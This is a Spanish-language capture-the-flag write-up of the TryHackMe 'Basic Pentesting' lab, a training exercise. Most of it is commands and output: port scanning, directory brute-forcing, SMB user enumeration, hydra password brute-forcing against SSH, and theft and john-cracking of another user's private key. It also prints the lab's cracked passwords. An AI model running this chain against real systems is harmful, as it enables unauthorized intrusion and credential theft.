
---
# Link: ([TryHackMe \| Basic Pentesting](https://tryhackme.com/room/basicpentestingjt))

---
# Descubrimiento

```shell
root@ip-10-10-184-252:~# nmap -sS -sV -Pn 10.10.93.23
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-05 09:59 BST
Nmap scan report for ip-10-10-93-23.eu-west-1.compute.internal (10.10.93.23)
Host is up (0.056s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 02:B6:27:C9:A5:1D (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.78 seconds
```

Vemos que hay varios servicios interesantes en esta máquina, estos pueden ser el puerto 22 puede que 80 dependiendo de lo que este dentro la pagina, porque se ve que es una pagina web por el servidor apache y samba si no esta bien protegido, también puede ser bastante interesante.

Vamos a empezar por lo más sencillo ver que hay en el 80.

![[Pasted image 20250705100118.png]]

Parece que a primera vista, lo que vería un usuario normal, no habría nada, pero como no somos normales, vamos a ver si hay alguna información que nos pueda ser útil en el código fuente.

![[Pasted image 20250705100353.png]]

Vemos como aquí nos encontramos con cosas que no deberíamos saber, como esa nota de la que hablan, vamos a descubrir donde esta esa nota con la herramienta "Gobuster".

```shell
root@ip-10-10-184-252:~# gobuster dir -u "http://10.10.93.23/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.93.23/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/development          (Status: 301) [Size: 316] [--> http://10.10.93.23/development/]
Progress: 55672 / 218276 (25.51%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 57081 / 218276 (26.15%)
===============================================================
Finished
===============================================================
```

He parado la búsqueda pronto, ya que veo que el directorio encontrado es el que parece que buscamos, por lo que se busca. Por lo que vamos a ver si hay algo de lo que buscamos en esa parte.

![[Pasted image 20250705101050.png]]

Efectivamente vemos que esta lo que buscamos, ahora vamos a ver lo que hay dentro de esas notas.

``` title=dev.txt txt
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

``` title=j.txt txt
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

En la primera nota no  se puede sacar mucha información en claro, pero en la segunda si vemos que hay información bastante interesante y nos da un posible vector de entrada sabiendo "J" tiene un usuario con una contraseña débil. Pero al no saber nada del usuario, y al haber agotado las oportunidades con el puerto 80, vamos a ver si podemos sacar algo de samba, haber si conseguimos la enumeración de usuarios que queremos, esto lo haremos mediante la herramienta "enum4linux".

![[Pasted image 20250705102140.png]]

Entre mucha información vemos que hay dos usuarios que coinciden con la letras, por lo que ahora sí, vamos a poder hacer fuerza bruta al usuario "jan" con la herramienta hydra al puerto ssh.
# Pentesting

```shell
root@ip-10-10-184-252:~# hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.93.23
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-05 10:26:22
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.93.23:22/
[STATUS] 135.00 tries/min, 135 tries in 00:01h, 14344269 to do in 1770:54h, 16 active
[STATUS] 114.00 tries/min, 342 tries in 00:03h, 14344062 to do in 2097:06h, 16 active
[STATUS] 106.00 tries/min, 742 tries in 00:07h, 14343662 to do in 2255:18h, 16 active
[22][ssh] host: 10.10.93.23   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 7 final worker threads did not complete until end.
[ERROR] 7 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-05 10:33:51
```

Ahora ya tenemos un usuario y contraseña, vamos a ver que encontramos en el SSH.

```shell
root@ip-10-10-184-252:~# ssh jan@10.10.93.23
The authenticity of host '10.10.93.23 (10.10.93.23)' can't be established.
ECDSA key fingerprint is SHA256:3FTgI2Wf2mvRds5ykpVFoPNdqMxhuS5WRwqK9+37/wA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.93.23' (ECDSA) to the list of known hosts.
jan@10.10.93.23's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 05 Jul 2025 05:37:28 AM EDT

  System load:  0.0                Processes:             106
  Usage of /:   50.5% of 13.62GB   Users logged in:       0
  Memory usage: 49%                IPv4 address for eth0: 10.10.93.23
  Swap usage:   0%

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Mon Apr 23 15:55:45 2018 from 192.168.56.102
jan@ip-10-10-93-23:~$ whoami
jan
jan@ip-10-10-93-23:~$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Apr 23  2018 .
drwxr-xr-x 5 root root 4096 Jul  5 04:57 ..
-rw------- 1 root jan    47 Apr 23  2018 .lesshst
jan@ip-10-10-93-23:~$ cd .lesshst
-bash: cd: .lesshst: Not a directory
jan@ip-10-10-93-23:~$ cat .lesshst 
cat: .lesshst: Permission denied
jan@ip-10-10-93-23:~$ cd ..
jan@ip-10-10-93-23:/home$ ls
jan  kay  ubuntu
jan@ip-10-10-93-23:/home$ cd kay 
jan@ip-10-10-93-23:/home/kay$ ls
pass.bak
jan@ip-10-10-93-23:/home/kay$ ls -la
total 48
drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
drwxr-xr-x 5 root root 4096 Jul  5 04:57 ..
-rw------- 1 kay  kay   789 Jun 22 13:41 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
jan@ip-10-10-93-23:/home/kay$ cd .ssh
jan@ip-10-10-93-23:/home/kay/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
jan@ip-10-10-93-23:/home/kay/.ssh$ ls -la
total 20
drwxr-xr-x 2 kay kay 4096 Apr 23  2018 .
drwxr-xr-x 5 kay kay 4096 Apr 23  2018 ..
-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
```

Vemos que tenemos en el usuario "kay" un clave privada de ssh... PREMIO GORDO :]. Ahora toca descifrarla y usarla.

```shell
root@ip-10-10-184-252:~# nano id_rsa
root@ip-10-10-184-252:~# john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_descifrado 
Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate.
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (id_rsa)
1g 0:00:00:09 DONE (2025-07-05 10:44) 0.1062g/s 1524Kp/s 1524Kc/s 1524KC/s *7¡Vamos!
Session completed.
```

Ahora vamos a usar la clave privada de SSH y la contraseña

```shell
root@ip-10-10-184-252:~# ssh -i id_rsa kay@10.10.93.23
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
kay@10.10.93.23's password: 

root@ip-10-10-184-252:~# chmod 600 id_rsa
root@ip-10-10-184-252:~# ssh -i id_rsa kay@10.10.93.23
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat 05 Jul 2025 05:46:27 AM EDT

  System load:  0.0                Processes:             111
  Usage of /:   50.6% of 13.62GB   Users logged in:       1
  Memory usage: 49%                IPv4 address for eth0: 10.10.93.23
  Swap usage:   0%

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.

Last login: Sun Jun 22 13:40:04 2025 from 10.23.8.228
kay@ip-10-10-93-23:~$ whoami
kay
kay@ip-10-10-93-23:~$ ls
pass.bak
kay@ip-10-10-93-23:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

Después de un pequeño error estamos dentro y tenemos la contraseña final.